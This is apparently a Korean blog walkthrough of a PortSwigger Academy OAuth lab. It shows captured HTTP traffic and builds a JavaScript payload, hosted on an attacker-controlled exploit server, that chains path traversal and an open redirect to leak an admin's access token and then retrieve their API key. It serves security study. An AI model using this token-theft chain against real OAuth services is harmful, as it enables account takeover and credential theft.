---
layout: post
title: "Burp Academy-OAuth 네번째 문제: Leaking authorization codes and access tokens"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth
- 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
- 난이도: PRACTITIONER (보통)


# 취약점 설명 : Stealing OAuth access tokens via an open redirect

```
Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the redirect_uri parameter to understand how it is being validated. For example:

Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:

https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
If you're not familiar with these techniques, we recommend reading our content on how to circumvent common SSRF defences and CORS.

You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:

https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as localhost.evil-user.net.
It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri.
```


# 랩설명: Stealing OAuth access tokens via an open redirect
이번 문제는 오픈 리다이렉트를 이용해서 관리자의 억세스 토큰을 취득, 그 토큰으로 관리자의 API 키를 얻어낸다. 그리고 이 키를 제출하면 문제가 풀린다. 

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note
You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.
```

# 풀이 
이 서버는 [이전 문제]({% post_url 2023-05-01-burp-academy-oauth-3 %})와 비슷하다. 이전문제는 Auth 코드는 얻어내는 문제였다면 이번에는 억세스 토큰을 얻어내는 문제이다. OAuth 서버는 redirect_uri를 검증하지 않으므로 오픈 리다이렉트가 가능할 것으로 생각된다. 

## 로그인 과정 관찰 
먼저 소셜 계정을 사용한 로그인 과정을 관찰한다. 
소셜 계정으로 로그인을 하려고 할 떄의 OAuth 서버로의 요청이다. redirect_uri가 파라메터로 포함되어 있다. 

```http
GET /auth?client_id=cd6rgm866pm5cuwa0e31m&redirect_uri=https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback&response_type=token&nonce=827317182&scope=openid%20profile%20email HTTP/2
Host: oauth-0aea007504828638856ddd8a0276005c.oauth-server.net
Cookie: _session=sOHbbwVosKh0_cCgeUbII; _session.legacy=sOHbbwVosKh0_cCgeUbII
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

OAuth 서버는 다음과 같은 302 리다이렉트 응답을 돌려준다. URL에 access_token이 포함되어 있는 것을 알 수 있다. 

```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=sOHbbwVosKh0_cCgeUbII; path=/; expires=Mon, 15 May 2023 23:49:12 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=sOHbbwVosKh0_cCgeUbII; path=/; expires=Mon, 15 May 2023 23:49:12 GMT; secure; httponly
Date: Mon, 01 May 2023 23:49:12 GMT
Keep-Alive: timeout=5
Content-Length: 459

Redirecting to <a href="https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/oauth-callback#access_token=uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.
```

위의 응답의 Location 헤더의 URL을 보면 access_token은 #으로 이어져 있다. 이는 해시를 의미한다.    
해시는 서버로는 전송되지 않는다. 따라서 클라이언트 서버의 억세스 로그에 남지 않는다. 이전 문제와 비교하면  보안이 더 강해졌다고 할 수 있겠다. 

실제로 이후의 클라이언트 어플리케이션으로의 요청(GET /oauth-callback)을 보면 다음과 같이 억세스 토큰이 포함되어 있지 않은 것을 볼 수 있다. 

```http
GET /oauth-callback HTTP/2
Host: 0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Cookie: session=GZzdOuW1rRMYqV2alS3nWbEM92a9fTxr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

위의 요청을 받은 클라이언트 어플리케이션 서버는 다음 응답을 회신한다.    
이 응답이 힌트가 될 것 같다. 이 시점에서는 자바스크립트를 통해 해시값에 접근할 수 있다(브라우저 URL에 해시가 보여지고 있는 상태다). 해시값을 가지고 공격자의 서버로 요청하도록 자바스크립트를 만들면 되지 않을까?

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 726

<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0aea007504828638856ddd8a0276005c.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

그리고 위의 자바스크립트가 동작하면 다음과 같은 요청(/me)이 발생한다. 위의 과정에서 얻은 억세스 토큰이 Authorization헤더에 들어가 있다. 

```http
GET /me HTTP/2
Host: oauth-0aea007504828638856ddd8a0276005c.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net/
Authorization: Bearer uSe12JouUJqqJXn7KRMuqTmSN1ZCxE0TK7ZbbeOj4eU
Content-Type: application/json
Origin: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers


```

위의 요청에 대한 응답이다. 웹 사이트는 OAuth 억세스 토큰을 받아서 apiKey를 회신해준다. 여기에 `apiKey`가 들어가 있다. 문제를 풀려면 관리자의 apiKey를 얻어내야 한다. 

```http
HTTP/2 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a4f00b204dd86d485d9dffc0046006e.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Mon, 01 May 2023 23:49:26 GMT
Keep-Alive: timeout=5
Content-Length: 132

{"sub":"wiener","apikey":"WEH9KMHqP0qUcIXtQY9Dt2chA4NESpUK","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
```

## 공격 포인트 찾아보기
이 공격을 성공시키려면 이 웹사이트에 오픈 리다이렉트 취약점이 있어야 한다. redirect_uri를 exploit 서버의 URL로 변경한 후, 웹 사이트 관리자가 그 URL에 접속하도록 해야하기 때문이다. 먼저 OAuth 서비스에 redirect_uri를 이용해서 오픈리다이렉트가 되는지 확인해본다. 

### redirect_uri 확인 
`GET /auth?client_id=xxxxx`요청을 Burp 리피터로 보낸 다음, redirect_uri를 변경할 수 있는지 확인해본다. 

```http
GET /auth?client_id=mqzu9z32x9qcdd553lnz6&redirect_uri=https://0a140018040e8156826060e40075003f.web-security-academy.net/oauth-callback/../&response_type=token&nonce=-1731113332&scope=openid%20profile%20email HTTP/2
Host: oauth-0aff00b2042081e782f25e1d02300010.oauth-server.net
Cookie: _session=RcZxkEoU0dDw0Yjekicx8; _session.legacy=RcZxkEoU0dDw0Yjekicx8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

그러면 서버가 정해진 URL(https://xxxx.web-security-academy.net/oauth-callback) 이외에는 400 Bad Request응답을 회신하는 것을 알 수 있다. 서버측에 검증 로직이 있는 것이다. 하지만 허점이 있을 거라고 생각할 수 있다. 

몇 가지 테스트를 해보면 이 서버의 검증로직은 URL의 전반부분이 일치하는지만 본다는 것을 알 수 있다. 즉, URL https://xxxx.web-security-academy.net/oauth-callback 이후에 추가된 부분이 있더라도 통과시킨다. 그렇다면 이럴 때 사용하는 테크닉은 디렉토리 트래버셜 취약점에서 사용할 수 있는 테크닉이 있다. 상위경로로 이동할 수 있는 `../` 이 그 것이다. 

실제로 사용가능한지 확인해보자. 로그아웃후 다시 로그인하고, `GET /auth?client_id=xxxxx`요청에서 redirect_uri를 다음과 같이 변경해본다. 

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1


그러면 다음과 같이 `../` 를 포함한 URL로 리다이렉트하라는 응답이 회신되는 것을 확인할 수 있다. 

```
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0a9b004103d7caa0829cbb39004500a5.web-security-academy.net/oauth-callback/../post?postId=1#access_token=8QwIbMgYs8ICx4atOCsB1T_WOjPaUSqUdZJIASvAiKy&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=YjOCsiPtXtdKjbFEGMiv4; path=/; expires=Tue, 23 May 2023 00:06:51 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=YjOCsiPtXtdKjbFEGMiv4; path=/; expires=Tue, 23 May 2023 00:06:51 GMT; secure; httponly
Date: Tue, 09 May 2023 00:06:51 GMT
Keep-Alive: timeout=5
Content-Length: 493

Redirecting to <a href="https://0a9b004103d7caa0829cbb39004500a5.web-security-academy.net/oauth-callback/../post?postId=1#access_token=8QwIbMgYs8ICx4atOCsB1T_WOjPaUSqUdZJIASvAiKy&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">https://0a9b004103d7caa0829cbb39004500a5.web-security-academy.net/oauth-callback/../post?postId=1#access_token=8QwIbMgYs8ICx4atOCsB1T_WOjPaUSqUdZJIASvAiKy&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email</a>.
```

그리고 웹 브라우저를 보면 다음과 같이 정상적으로 기사 페이지가 표시되는 것을 확인할 수 있다. 

![리다이렉트와 디렉토리 트래버셜 확인](/images/burp-academy-oauth-4-1.png)

정리해보자. OAuth 서버의 `/auth` 엔드포인트에는 redirect_uri검증 로직에 미비가 있어 URL 뒷 부분에 `../`를 붙이는 것이 가능했다. 그리고 웹 사이트(클라이언트 어플리케이션)에는 디렉토리 트래버셜 취약점이 있어서 웹 사이트내의 특정 경로를 `../`를 이용해서 접근할 수 있는 것을 확인했다. 

### 오픈 리다이렉트 가능한 곳 확인
그러나 위의 취약점만으로는 오픈 리다이렉트는 불가능하다. `../`를 사용해도 도달가능한 곳은 xxxx.web-security-academy.net 서버의 루트 디렉토리까지이다. 별도 서버로는 응답을 보낼 수 없다. 오픈 리다이렉트가 가능한 별도 엔드포인트가 있을 것이다. 그 곳을 찾아야 한다. 

사이트를 살펴보다보면, Next Post 버튼을 눌렀을 때 다음과 같은 요청이 발생하는 것을 확인 가능하다. `path`파라메터가 아주 흥미롭다. 

```http 
GET /post/next?path=/post?postId=3 HTTP/2
Host: 0a9b004103d7caa0829cbb39004500a5.web-security-academy.net
Cookie: session=l86wg3DL38eXwdHBH6jajVnHaInnJN8O
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a9b004103d7caa0829cbb39004500a5.web-security-academy.net/post?postId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


```

path파라메터를 여러가지 값으로 바꿔본다. 서버 URL도 변경해본다. 그러면 다음과 같이 오픈리다이렉트가 되는 것을 확인가능하다.

![오픈리다이렉트 확인](/images/burp-academy-oauth-4-2.png)

## exploit 준비 
### 취약점 합치기 
그러면 위의 과정에서 확인한 취약점들을 합쳐보자. 다음과 같은 URL이 된다. 

```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```

어떻게 동작할지 상세하게 살펴보자. 

1. OAuth 서비스는 redirect_uri `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit` 를 검증한다. `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/`까지만 검증하므로 이 URL는 문제없이 검증을 통과할 것이다. 

2. 위의 redirect_uri의 값대로 리다이렉트되므로 위의 URL은 다음과 같은 단계를 거쳐 최종적으로는 exploit서버로 접속하는 URL이 된다. 

- https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit
- https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit
- https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit


위의 제대로 동작하는지 테스트해본다. 브라우저에서 해당 URL에 접속하면 리다이렉트가 반복되어 최종적으로 exploit 서버의 "Hello, world!"가 출력되는 페이지에 도달하는지 확인해본다. 

```
https://oauth-0a030016049327d783df301f02da00a9.oauth-server.net/auth?client_id=rirwiy73ju33bu3aaagkz&redirect_uri=https://0af7008c041e2727836132b1007900b2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ae800950467277b83ed31d5011f00b9.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

https://0af7008c041e2727836132b1007900b2.web-security-academy.net/
```

다음과 같이 exploit서버에 도달한 것을 확인하였다. URL을 보면 해시부분에 억세스 토큰이 있는 것을 볼 수 있다. 

![exploit서버에 도달한 것을 확인](/images/burp-academy-oauth-4-3.png)

### 해시부분 얻어낼 수 있는지 확인하기 
다음과 같은 스크립트를 준비한다. 이 스크립트가 동작하면 해시부분의 억세스 토큰을 exploit서버로 전달해줄 것이다. 

```html
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

exploit서버에서 저장한 후 다시한번 브라우저로 위의 URL을 방문해본다. 그리고 access 로그를 확인하면 억세스 토큰이 포함된 요청이 있는 것을 확인할 수 있다.  

### exploit 코드완성 

그러면 이제 모든 테스트가 끝났다. 관리자의 억세스 토큰을 얻어내기 위한 코드를 다음과 같이 준비한다. 
이 페이지를 방문한 유저의 URL에 억세스토큰이 없으면 억세스 토큰을 포함하도록 리다이렉트 시키고, 억세스 토큰이 있으면 해당 토큰을 포함해서 GET요청을 하도록(그래서 억세스 로그에 남기도록) 시킨다. 

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

## exploit 실시
### 억세스 토큰 취득하기 
Deliver exploit to victim버튼을 누르고 억세스 로그를 확인하면 다른 IP에서 접근한 이력중에 access_token이 포함된 요청이 있는 것이 보인다. 이 것이 이 사이트 관리자의 억세스 토큰이다. 

### 억세스 토큰으로 apiKey얻어내기 

apiKey를 얻어내는 /me 요청을 Burp 리피터로 보내서 Authorization: Bearer 부분의 값을 억세스 토큰으로 변경한 후 요청을 보낸다. 그러면 응답에 관리자의 apiKey가 포함되어 있는 것을 확인할 수 있다. 

![apkiKey얻어내기](/images/burp-academy-oauth-4-4.png)

이 apiKey를 제출하면 문제 풀이에 성공했다는 메세지가 나타난다. 

![성공](/images/burp-academy-oauth-4-success.png)


# 소감 
- 난이도는 중간이지만 꽤나 어려운 문제였다. 결국 답을 보고 풀었다. 
- 오픈리다이렉트를 한번에 성공시키기 위해 여러 취약점을 조합시키는 기술이 필요했다. (OAuth 서버의 redirect_uri 검증통과 취약점, 웹 사이트의 패스 트래버셜 취약점과 오픈 리다이렉트 취약점)
- exploit서버에서 조건에 따라 유저를 분기시키는 것을 생각해내지 못했다. Burp Collaborator를 써야 하나하고 고민했다. 
- 꽤 좋은 공부가 되었다. 